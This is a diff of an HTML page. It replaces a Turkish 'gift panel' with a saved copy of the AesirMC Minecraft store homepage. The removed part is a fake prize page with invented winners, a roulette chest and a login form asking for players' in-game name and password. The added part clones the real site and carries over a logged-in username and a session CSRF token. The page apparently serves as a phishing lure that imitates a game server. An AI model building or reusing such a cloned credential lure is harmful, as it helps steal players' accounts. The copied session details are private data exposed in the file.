900;src:url(/cf-fonts/v/rubik/5.0.18/latin-ext/wght/italic.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/hebrew/wght/italic.woff2);unicode-range:U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/arabic/wght/italic.woff2);unicode-range:U+0600-06FF,U+0750-077F,U+0870-088E,U+0890-0891,U+0898-08E1,U+08E3-08FF,U+200C-200E,U+2010-2011,U+204F,U+2E41,U+FB50-FDFF,U+FE70-FE74,U+FE76-FEFC;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/cyrillic-ext/wght/italic.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/latin/wght/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}</style>
+
+	<link rel="stylesheet" type="text/css" href="./AesirMC - MMORPG Minecraft_files/all.min.css">
+
+	<!-- THEMES -->
+	<link rel="stylesheet" type="text/css" href="./AesirMC - MMORPG Minecraft_files/aesirmc.1774884863.css">
+
+	<link rel="stylesheet" type="text/css" href="./AesirMC - MMORPG Minecraft_files/content-styles.1768293220.css">
+	
+		<script src="./AesirMC - MMORPG Minecraft_files/2440236043103454" async=""></script><script async="" src="./AesirMC - MMORPG Minecraft_files/fbevents.js.indir"></script><script type="text/javascript">
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window,document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+ fbq('init', '2440236043103454'); 
+fbq('track', 'PageView');
+</script>
+<noscript>
+ <img height="1" width="1" 
+src="https://www.facebook.com/tr?id=2440236043103454&ev=PageView
+&noscript=1"/>
+</noscript>
+
+    <script src="./AesirMC - MMORPG Minecraft_files/axios.min.js.indir" type="text/javascript"></script>
+
+	<!-- CUSTOM CSS -->
+	<style type="text/css">
+		#powered_by_leaderos {
+  pointer-events: none;
+  user-select: none;
+}
+	</style>
+	
+	<!-- ROLE CSS -->
+	<style type="text/css">
+								
+											
+											
+											
+											
+					
+
+        :root {
+            --color-cyan-300: 103 232 249;
+--color-cyan-500: 6 182 212;
+--color-cyan-600: 8 145 178;
+--color-cyan-700: 14 116 144;
+--color-cyan-800: 21 94 117;
+--color-cyan-900: 22 78 99;
+--color-cyan-950: 8 51 68;
+--color-sky-100: 224 242 254;
+--color-sky-400: 56 189 248;
+--color-sky-500: 14 165 233;
+--color-sky-600: 2 132 199;
+--color-sky-700: 3 105 161;
+--color-sky-950: 8 47 73;
+--color-blue-500: 59 130 246;
+--color-blue-600: 37 99 235;
+        }
+	</style>
+	
+	
+    <script defer="" src="./AesirMC - MMORPG Minecraft_files/cdn.min.js.indir" type="text/javascript"></script>
+    <script defer="" src="./AesirMC - MMORPG Minecraft_files/cdn.min(1).js.indir" type="text/javascript"></script>
+    <script defer="" src="./AesirMC - MMORPG Minecraft_files/cdn.min(2).js.indir" type="text/javascript"></script>
+    <script defer="" src="./AesirMC - MMORPG Minecraft_files/cdn.min(3).js.indir" type="text/javascript"></script>
+    <script src="./AesirMC - MMORPG Minecraft_files/slimselect.min.js.indir" type="text/javascript"></script>
+    <script src="./AesirMC - MMORPG Minecraft_files/gsap.min.js.indir" type="text/javascript"></script>
+    <script src="./AesirMC - MMORPG Minecraft_files/ScrollTrigger.min.js.indir" type="text/javascript"></script>
+  <meta name="facebook-domain-verification" content="re6zd3c0p69uevd2hp23ftvhe57alu">
 </head>
-<body>
+<body x-data="body" :class="{&#39;overflow-hidden&#39;:modal}" data-aos-easing="ease" data-aos-duration="500" data-aos-delay="50">
+<div id="app">
+	    <script type="text/javascript">
+        function Marquee(selector, speed) {
+            const parentSelector = document.querySelector(selector);
+            const clone = parentSelector.innerHTML;
+            const firstElement = parentSelector.children[0];
+            let i = 0;
+            let marqueeInterval;
 
-<div class="live-winners">
-    <div class="winner-track">• Steve kazandı: Elmas Kılıç • Herobrine kazandı: Netherite Külçesi • Alex kazandı: Büyülü Elma • Aesir_User kazandı: 64x Havai Fişek •</div>
-</div>
+            parentSelector.insertAdjacentHTML('beforeend', clone);
+            parentSelector.insertAdjacentHTML('beforeend', clone);
 
-<nav>
-    <div style="font-size: 30px; text-shadow: 2px 2px #000;">AESİR GİFT PANEL</div>
-    <div id="user-display" style="color: #ffff55; font-size: 24px;"></div>
-</nav>
+            function startMarquee() {
+                marqueeInterval = setInterval(function () {
+                    firstElement.style.marginLeft = `-${i}px`;
+                    if (i > firstElement.clientWidth) {
+                        i = 0;
+                    }
+                    i = i + speed;
+                }, 0);
+            }
 
-<div id="auth-container">
-    <h2 style="color: #333;">AESIR CRAFT GİRİŞ</h2>
-    <input type="text" id="username" placeholder="OYUNCU ADI">
-    <input type="password" id="password" placeholder="ŞİFRE">
-    <button class="btn-mc" style="margin-top: 15px;" onclick="girisYap()">DÜNYAYA KATIL</button>
-</div>
+            function stopMarquee() {
+                clearInterval(marqueeInterval);
+            }
 
-<div id="game-container">
-    <h1 id="welcome-msg" style="font-size: 40px; text-shadow: 3px 3px #000;"></h1>
-    <div id="gift-box-container">
-        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="mc-chest" onclick="hediyeyiAc()">
-        <p style="color:#ffff55; font-size: 24px; text-shadow: 2px 2px #000;">SANDIĞI AÇMAK İÇİN TIKLA!</p>
+            parentSelector.addEventListener('mouseenter', stopMarquee);
+            parentSelector.addEventListener('mouseleave', startMarquee);
+
+            startMarquee();
+        }
+
+        window.addEventListener('load', () => Marquee('.marquee', 0.4));
+    </script>
+    <div id="banner" style="color: #d7ebe8;" class="overflow-hidden bg-custom py-3 text-center tracking-wider font-semibold text-lg z-[100] flex">
+        <div class="marquee flex whitespace-nowrap">
+                            <div class="w-screen shrink-0 flex items-center justify-center" style="margin-left: -282.8px;">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [BOXPVP EJDERDOĞAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [TOWNY EJDER KUMANDAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [Sitedeki Tüm Ürünlerde %50 İNDİRİM!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [MMORPG YEŞİM KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [SKYBLOCK VALKÜR KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [FACTİON MEKA KASA GELDİ!]                        </a>
+                                    </div>
+            
+        
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [BOXPVP EJDERDOĞAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [TOWNY EJDER KUMANDAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [Sitedeki Tüm Ürünlerde %50 İNDİRİM!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [MMORPG YEŞİM KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [SKYBLOCK VALKÜR KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [FACTİON MEKA KASA GELDİ!]                        </a>
+                                    </div>
+            
+        
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [BOXPVP EJDERDOĞAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [TOWNY EJDER KUMANDAN KASA GELDİ!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [Sitedeki Tüm Ürünlerde %50 İNDİRİM!]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [MMORPG YEŞİM KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [SKYBLOCK VALKÜR KASA GELDİ]                        </a>
+                                    </div>
+                            <div class="w-screen shrink-0 flex items-center justify-center">
+                                            <a href="https://store.aesirmc.com/aesir-points" class="hover:underline">
+                            [FACTİON MEKA KASA GELDİ!]                        </a>
+                                    </div>
+            
+        </div>
     </div>
-    <div id="roulette-section">
-        <div class="roulette-container"><div id="roulette-strip"></div></div>
-        <button id="spin-btn" class="btn-mc" onclick="ruletiBaslat()">KASAYI ÇEVİR!</button>
+
+
+
+<header id="header">
+    <div class="relative flex items-center min-h-16">
+        <div class="hidden lg:block">
+            <a href="https://store.aesirmc.com/" class="text-5xl mt-6 text-stroke tracking-wider boldenvan">
+                AesirMC            </a>
+            <div class="mt-2 text-emerald-400 font-black rounded-xl hidden flex items-center gap-2">
+                <div class="center">
+                    <div class="absolute w-3 h-3 bg-emerald-400/75 animate-ping rounded-full"></div>
+                    <div class="w-2 h-2 bg-emerald-400 rounded-full"></div>
+                </div>
+                <span x-init="getOnline(&#39;launcher.aesirmc.com&#39;)" x-text="onlinePlayers">1799</span> online
+            </div>
+        </div>
+        <div class="absolute lg:left-1/2 lg:-translate-x-1/2">
+            <nav class="nav-container">
+                                                            <a href="https://store.aesirmc.com/" class="nav-item active">
+                            Anasayfa                        </a>
+                                                                                <a href="https://store.aesirmc.com/store" class="nav-item ">
+                            Mağaza                        </a>
+                                                                                <a href="https://store.aesirmc.com/support/tickets" class="nav-item ">
+                            Destek                        </a>
+                                                                                <a href="https://store.aesirmc.com/launcher" class="nav-item ">
+                            Launcher                        </a>
+                                                                                <div class="relative" x-data="{dropdown: false}" @click.outside="dropdown=false">
+                            <div @click="dropdown=!dropdown" class="nav-item cursor-pointer relative z-20 flex items-center gap-2 hidden xl:flex ">
+                                Yardım
+                                <svg :class="[dropdown ? &#39;rotate-180&#39;:&#39;&#39;]" class="fill-current w-6 transition-all" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4.39 6.366a1.397 1.397 0 0 1 1.886 0L8 7.982l1.724-1.616a1.397 1.397 0 0 1 1.886 0c.52.488.52 1.28 0 1.768l-2.667 2.5a1.397 1.397 0 0 1-1.886 0l-2.666-2.5a1.196 1.196 0 0 1 0-1.768Z"></path>
+                                </svg>
+                            </div>
+                            <div :class="[dropdown ? &#39;-translate-y-12&#39;:&#39;-translate-y-[120%]&#39;]" class="top-0 transition-all scale-110 absolute w-full p-2 bg-cyan-900 rounded-t-none rounded-2xl mask-card -translate-y-[120%]">
+                                <div class="mask-card flex flex-col gap-2 bg-black/50 rounded-2xl pt-32 pb-2 text-center">
+                                                                            <a href="https://store.aesirmc.com/blog/posts/yetkili-alimlarimiz-acilmistir/" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            YETKİLİ BAŞVURU                                        </a>
+                                                                            <a href="https://store.aesirmc.com/suggestions" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            ÖNERİLER                                        </a>
+                                                                            <a href="https://store.aesirmc.com/aesirmc-kurallar-ve-cezalari" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            KURALLAR                                        </a>
+                                                                            <a href="https://store.aesirmc.com/punishments" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            Cezalar                                        </a>
+                                                                            <a href="https://store.aesirmc.com/blog/" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            Haberler                                        </a>
+                                                                            <a href="https://store.aesirmc.com/forgot-password/" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5">
+                                            Şifremi Unuttum                                        </a>
+                                                                            <a href="https://wiki.aesirmc.com/" class="py-2.5 px-5 text-white/75 text-xl font-bold transition hover:text-white hover:bg-white/5" target="_blank">
+                                            Wiki                                        </a>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                                                </nav>
+            <div id="mobilNav" @click="toggleMobilMenu">
+                <svg class="fill-current w-10" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M21.002 5.25H3.00195C2.59195 5.25 2.25195 4.91 2.25195 4.5C2.25195 4.09 2.59195 3.75 3.00195 3.75H21.002C21.412 3.75 21.752 4.09 21.752 4.5C21.752 4.91 21.412 5.25 21.002 5.25Z"></path>
+                    <path opacity="0.4" d="M16.7417 10.25H7.26172C6.85172 10.25 6.51172 9.91 6.51172 9.5C6.51172 9.09 6.85172 8.75 7.26172 8.75H16.7317C17.1417 8.75 17.4817 9.09 17.4817 9.5C17.4817 9.91 17.1517 10.25 16.7417 10.25Z"></path>
+                    <path d="M21.002 15.25H3.00195C2.59195 15.25 2.25195 14.91 2.25195 14.5C2.25195 14.09 2.59195 13.75 3.00195 13.75H21.002C21.412 13.75 21.752 14.09 21.752 14.5C21.752 14.91 21.412 15.25 21.002 15.25Z"></path>
+                    <path opacity="0.4" d="M16.7417 20.25H7.26172C6.85172 20.25 6.51172 19.91 6.51172 19.5C6.51172 19.09 6.85172 18.75 7.26172 18.75H16.7317C17.1417 18.75 17.4817 19.09 17.4817 19.5C17.4817 19.91 17.1517 20.25 16.7417 20.25Z"></path>
+                </svg>
+            </div>
+
+        </div>
+        <div class="ml-auto md:p-6 flex justify-end items-center gap-4">
+                            <div class="relative">
+                    <div x-bind="dropdownButton" class="flex gap-4 h-fit items-center transition-all duration-75 cursor-pointer">
+                        <div class="text-right text-white font-bold text-lg">
+                            BattierWord                        </div>
+                        <img class="relative w-12 rounded-full" src="./AesirMC - MMORPG Minecraft_files/128.png" alt="BattierWord">
+                    </div>
+                    <div x-bind="dropdown" class="dropdown" style="display: none;">
+                        <a href="https://store.aesirmc.com/profile/" class="dropdown-item">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12.161 11.62C12.131 11.62 12.111 11.62 12.081 11.62C12.031 11.61 11.961 11.61 11.901 11.62C9.00103 11.53 6.81104 9.25 6.81104 6.44C6.81104 3.58 9.14104 1.25 12.001 1.25C14.861 1.25 17.191 3.58 17.191 6.44C17.181 9.25 14.981 11.53 12.191 11.62C12.181 11.62 12.171 11.62 12.161 11.62ZM12.001 2.75C9.97104 2.75 8.31104 4.41 8.31104 6.44C8.31104 8.44 9.87103 10.05 11.861 10.12C11.911 10.11 12.051 10.11 12.181 10.12C14.141 10.03 15.681 8.42 15.691 6.44C15.691 4.41 14.031 2.75 12.001 2.75Z"></path>
+                                <path d="M12.1711 22.55C10.2111 22.55 8.24107 22.05 6.75107 21.05C5.36107 20.13 4.60107 18.87 4.60107 17.5C4.60107 16.13 5.36107 14.86 6.75107 13.93C9.75107 11.94 14.6111 11.94 17.5911 13.93C18.9711 14.85 19.7411 16.11 19.7411 17.48C19.7411 18.85 18.9811 20.12 17.5911 21.05C16.0911 22.05 14.1311 22.55 12.1711 22.55ZM7.58107 15.19C6.62107 15.83 6.10107 16.65 6.10107 17.51C6.10107 18.36 6.63107 19.18 7.58107 19.81C10.0711 21.48 14.2711 21.48 16.7611 19.81C17.7211 19.17 18.2411 18.35 18.2411 17.49C18.2411 16.64 17.7111 15.82 16.7611 15.19C14.2711 13.53 10.0711 13.53 7.58107 15.19Z"></path>
+                            </svg>
+                            Profil                        </a>
+                                                    <a href="https://store.aesirmc.com/support/tickets/" class="dropdown-item">
+                                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 22.81C11.31 22.81 10.66 22.46 10.2 21.85L8.7 19.85C8.67 19.81 8.55 19.75 8.49 19.75H8C3.83 19.75 1.25 18.62 1.25 13V8C1.25 3.58 3.58 1.25 8 1.25H14C14.41 1.25 14.75 1.59 14.75 2C14.75 2.41 14.41 2.75 14 2.75H8C4.42 2.75 2.75 4.42 2.75 8V13C2.75 17.52 4.3 18.25 8 18.25H8.5C9.01 18.25 9.59 18.54 9.9 18.95L11.4 20.95C11.75 21.41 12.25 21.41 12.6 20.95L14.1 18.95C14.43 18.51 14.95 18.25 15.5 18.25H16C19.58 18.25 21.25 16.58 21.25 13V10C21.25 9.59 21.59 9.25 22 9.25C22.41 9.25 22.75 9.59 22.75 10V13C22.75 17.42 20.42 19.75 16 19.75H15.5C15.42 19.75 15.35 19.79 15.3 19.85L13.8 21.85C13.34 22.46 12.69 22.81 12 22.81Z"></path>
+                                    <path d="M12 12C11.44 12 11 11.55 11 11C11 10.45 11.45 10 12 10C12.55 10 13 10.45 13 11C13 11.55 12.56 12 12 12Z"></path>
+                                    <path d="M16 12C15.44 12 15 11.55 15 11C15 10.45 15.45 10 16 10C16.55 10 17 10.45 17 11C17 11.55 16.56 12 16 12Z"></path>
+                                    <path d="M8 12C7.44 12 7 11.55 7 11C7 10.45 7.45 10 8 10C8.55 10 9 10.45 9 11C9 11.55 8.56 12 8 12Z"></path>
+                                    <path d="M19.5 7.75C17.71 7.75 16.25 6.29 16.25 4.5C16.25 2.71 17.71 1.25 19.5 1.25C21.29 1.25 22.75 2.71 22.75 4.5C22.75 6.29 21.29 7.75 19.5 7.75ZM19.5 2.75C18.54 2.75 17.75 3.54 17.75 4.5C17.75 5.46 18.54 6.25 19.5 6.25C20.46 6.25 21.25 5.46 21.25 4.5C21.25 3.54 20.46 2.75 19.5 2.75Z"></path>
+                                </svg>
+
+
+                                Destek Talepleri                            </a>
+                                                                                                                                                    <a href="https://store.aesirmc.com/gifts/" class="dropdown-item">
+                                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M15.97 22.75H7.96997C4.54997 22.75 3.21997 21.42 3.21997 18V10C3.21997 9.59 3.55997 9.25 3.96997 9.25H19.97C20.38 9.25 20.72 9.59 20.72 10V18C20.72 21.42 19.39 22.75 15.97 22.75ZM4.71997 10.75V18C4.71997 20.58 5.38997 21.25 7.96997 21.25H15.97C18.55 21.25 19.22 20.58 19.22 18V10.75H4.71997Z"></path>
+                                    <path d="M19.5 10.75H4.5C2.75 10.75 1.75 9.75 1.75 8V7C1.75 5.25 2.75 4.25 4.5 4.25H19.5C21.2 4.25 22.25 5.3 22.25 7V8C22.25 9.7 21.2 10.75 19.5 10.75ZM4.5 5.75C3.59 5.75 3.25 6.09 3.25 7V8C3.25 8.91 3.59 9.25 4.5 9.25H19.5C20.38 9.25 20.75 8.88 20.75 8V7C20.75 6.12 20.38 5.75 19.5 5.75H4.5Z"></path>
+                                    <path d="M11.6401 5.74988H6.12009C5.91009 5.74988 5.71009 5.65988 5.57009 5.50988C4.96009 4.83988 4.98009 3.80988 5.62009 3.16988L7.04009 1.74988C7.70009 1.08988 8.79009 1.08988 9.45009 1.74988L12.1701 4.46988C12.3801 4.67988 12.4501 5.00988 12.3301 5.28988C12.2201 5.56988 11.9501 5.74988 11.6401 5.74988ZM6.67009 4.24988H9.84009L8.39009 2.80988C8.31009 2.72988 8.18009 2.72988 8.10009 2.80988L6.68009 4.22988C6.68009 4.23988 6.67009 4.23988 6.67009 4.24988Z"></path>
+                                    <path d="M17.8701 5.74988H12.3501C12.0501 5.74988 11.7701 5.56988 11.6601 5.28988C11.5401 5.00988 11.6101 4.68988 11.8201 4.46988L14.5401 1.74988C15.2001 1.08988 16.2901 1.08988 16.9501 1.74988L18.3701 3.16988C19.0101 3.80988 19.0401 4.83988 18.4201 5.50988C18.2801 5.65988 18.0801 5.74988 17.8701 5.74988ZM14.1701 4.24988H17.3401C17.3301 4.23988 17.3301 4.23988 17.3201 4.22988L15.9001 2.80988C15.8201 2.72988 15.6901 2.72988 15.6101 2.80988L14.1701 4.24988Z"></path>
+                                    <path d="M9.93994 16.9C9.65994 16.9 9.36994 16.83 9.10994 16.69C8.53994 16.38 8.18994 15.79 8.18994 15.15V10C8.18994 9.59 8.52994 9.25 8.93994 9.25H14.9799C15.3899 9.25 15.7299 9.59 15.7299 10V15.13C15.7299 15.78 15.3799 16.37 14.8099 16.67C14.2399 16.98 13.5499 16.94 13.0099 16.58L12.1199 15.98C12.0399 15.92 11.9299 15.92 11.8399 15.98L10.8999 16.6C10.6099 16.8 10.2699 16.9 9.93994 16.9ZM9.68994 10.75V15.14C9.68994 15.27 9.76994 15.33 9.81994 15.36C9.86994 15.39 9.96994 15.42 10.0799 15.35L11.0199 14.73C11.6099 14.34 12.3699 14.34 12.9499 14.73L13.8399 15.33C13.9499 15.4 14.0499 15.37 14.0999 15.34C14.1499 15.31 14.2299 15.25 14.2299 15.12V10.74H9.68994V10.75Z"></path>
+                                </svg>
+
+                                Hediye                            </a>
+                                                
+                        <div class="py-1 border-t border-zinc-800">
+                            <form action="https://store.aesirmc.com/logout/" method="post">
+                                <input type="hidden" name="csrf_token" value="2f568603318084bf1547ebe43a5c3d474045e5add92e043f293706779f488ce9">                                <button type="submit" class="w-full transition hover:bg-red-500/10 hover:text-red-500 py-1.5 px-4 flex gap-2 items-center rounded-lg">
+                                    <svg class="w-4 fill-current" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M12.161 11.62C12.131 11.62 12.111 11.62 12.081 11.62C12.031 11.61 11.961 11.61 11.901 11.62C9.00103 11.53 6.81104 9.25 6.81104 6.44C6.81104 3.58 9.14104 1.25 12.001 1.25C14.861 1.25 17.191 3.58 17.191 6.44C17.181 9.25 14.981 11.53 12.191 11.62C12.181 11.62 12.171 11.62 12.161 11.62ZM12.001 2.75C9.97104 2.75 8.31104 4.41 8.31104 6.44C8.31104 8.44 9.87103 10.05 11.861 10.12C11.911 10.11 12.051 10.11 12.181 10.12C14.141 10.03 15.681 8.42 15.691 6.44C15.691 4.41 14.031 2.75 12.001 2.75Z"></path>
+                                        <path d="M12.1711 22.55C10.2111 22.55 8.24107 22.05 6.75107 21.05C5.36107 20.13 4.60107 18.87 4.60107 17.5C4.60107 16.13 5.36107 14.86 6.75107 13.93C9.75107 11.94 14.6111 11.94 17.5911 13.93C18.9711 14.85 19.7411 16.11 19.7411 17.48C19.7411 18.85 18.9811 20.12 17.5911 21.05C16.0911 22.05 14.1311 22.55 12.1711 22.55ZM7.58107 15.19C6.62107 15.83 6.10107 16.65 6.10107 17.51C6.10107 18.36 6.63107 19.18 7.58107 19.81C10.0711 21.48 14.2711 21.48 16.7611 19.81C17.7211 19.17 18.2411 18.35 18.2411 17.49C18.2411 16.64 17.7111 15.82 16.7611 15.19C14.2711 13.53 10.0711 13.53 7.58107 15.19Z"></path>
+                                    </svg>
+                                    Çıkış Yap                                </button>
+                            </form>
+
+                        </div>
+                    </div>
+                </div>
+                    </div>
+    </div>
+</header>
+
+<aside x-show="mobilMenu" class="fixed block lg:hidden inset-0 bg-zinc-900/50 backdrop-blur-sm z-[103]" style="display: none;">
+    <div @click.outside="mobilMenu = false" x-show="mobilMenu" x-transition:enter="transition ease-out duration-100" x-transition:enter-start="opacity-0 -translate-x-full" x-transition:enter-end="opacity-100 translate-x-0" x-transition:leave="transition ease-in duration-100" x-transition:leave-start="opacity-100 translate-x-0" x-transition:leave-end="opacity-0 -translate-x-full" class="text-zinc-100/75 bg-zinc-900 p-6 w-3/4 h-full font-light" style="display: none;">
+        <div class="py-3 px text-sm uppercase">Menu</div>
+        <div class="mt-2 flex flex-col divide-y divide-zinc-600/20">
+                            <a href="https://store.aesirmc.com/" class="py-3 px-5 bg-cyan-700 rounded-xl text-white font-medium">
+                    Anasayfa                </a>
+                            <a href="https://store.aesirmc.com/store" class="py-3 px-5 ">
+                    Mağaza                </a>
+                            <a href="https://store.aesirmc.com/support/tickets" class="py-3 px-5 ">
+                    Destek                </a>
+                            <a href="https://store.aesirmc.com/launcher" class="py-3 px-5 ">
+                    Launcher                </a>
+                            <a href="https://store.aesirmc.com/help" class="py-3 px-5 ">
+                    Yardım                </a>
+                    </div>
+    </div>
+</aside>
+
+    <main>
+        
+
+
+<div id="customHead" x-data="heroHome()" class="relative py-10 z-20 overflow-hidden min-h-screen -top-[8.8rem]">
+    <div class="absolute inset-0 bg-cover bg-top" style="background-image: url(&#39;/assets/aesirmc/img/background2.png&#39;)"></div>
+    <div class="absolute inset-x-0 top-0 bg-gradient-to-b from-black/50 h-40"></div>
+    <div class="absolute pointer-events-none left-0 bottom-40">
+        <img loading="lazy" fetchpriority="high" class="w-[46rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/cloud.webp" alt="" x-ref="cloud_left">
+    </div>
+    <div class="absolute pointer-events-none right-0 bottom-32 -rotate-6">
+        <img loading="lazy" fetchpriority="high" class="h-[40rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/cloud2.webp" alt="" x-ref="cloud_right">
+    </div>
+    <div class="absolute pointer-events-none left-80 bottom-32 hidden xl:block">
+        <img loading="lazy" fetchpriority="high" class="w-[36rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/castle.webp" alt="" x-ref="image_castle">
+    </div>
+    <div class="absolute pointer-events-none z-30 inset-x-0 bottom-0">
+        <img loading="lazy" fetchpriority="high" class="will-change-auto" src="./AesirMC - MMORPG Minecraft_files/bottom.webp" alt="" x-ref="image_bottom">
+    </div>
+    <div class="absolute pointer-events-none left-0 bottom-0">
+        <img loading="lazy" fetchpriority="high" class="w-[38rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/left.webp" alt="" x-ref="image_mountain1">
+    </div>
+    <div class="absolute pointer-events-none right-40 bottom-1/3 hidden md:block">
+        <img loading="lazy" fetchpriority="high" class="w-[36rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/dragon.webp" alt="" x-ref="image_dragon">
+    </div>
+    <div class="absolute pointer-events-none right-0 bottom-0">
+        <img loading="lazy" fetchpriority="high" class="w-[46rem] will-change-auto" src="./AesirMC - MMORPG Minecraft_files/right.webp" alt="" x-ref="image_mountain2">
+    </div>
+    <div class="absolute pointer-events-none z-30 inset-x-0 -bottom-20 h-[48rem] bg-cover bg-center will-change-auto" x-ref="image_bottom2" style="background-image: url(&#39;/assets/aesirmc/img/bgsk.svg&#39;)">
+    </div>
+
+    <div id="overlay" class="absolute inset-0 z-20 bg-gradient-to-b from-black/35 via-black/20 to-from-black/15 pointer-events-none transition-all" style="mask-image: radial-gradient(320px at 2047px 32px, transparent 0%, black 100%);"></div>
+
+    <div class="py-20 relative z-20" x-ref="head_main">
+        <div x-data="logoHoverMotion" @mouseenter="onEnter($event)" @mousemove="onMove($event)" x-ref="logo" @mouseleave="onLeave" class="mx-auto mt-14 center relative z-30 w-[30rem]">
+            <img class="pointer-events-none w-72 lg:w-[30rem] absolute z-10 opacity-15" src="./AesirMC - MMORPG Minecraft_files/logo.png" alt="">
+            <a href="https://store.aesirmc.com/" class="w-44 lg:w-80">
+                <img loading="lazy" fetchpriority="high" class="w-44 lg:w-80 relative z-20" src="./AesirMC - MMORPG Minecraft_files/logo.1768293220.png" alt="">
+            </a>
+        </div>
+
+        <h1 class="mt-10 text-white font-semibold lg:font-black text-5xl lg:text-6xl mx-auto max-w-4xl text-center drop-shadow-xl">
+            MMORPG Minecraft        </h1>
+
+        <div class="mt-12 flex justify-center gap-4">
+            <a href="https://discord.gg/k8qFbQhbHX" class="relative overflow-hidden center w-14 h-14 group rounded-full bg-indigo-500 text-white">
+            
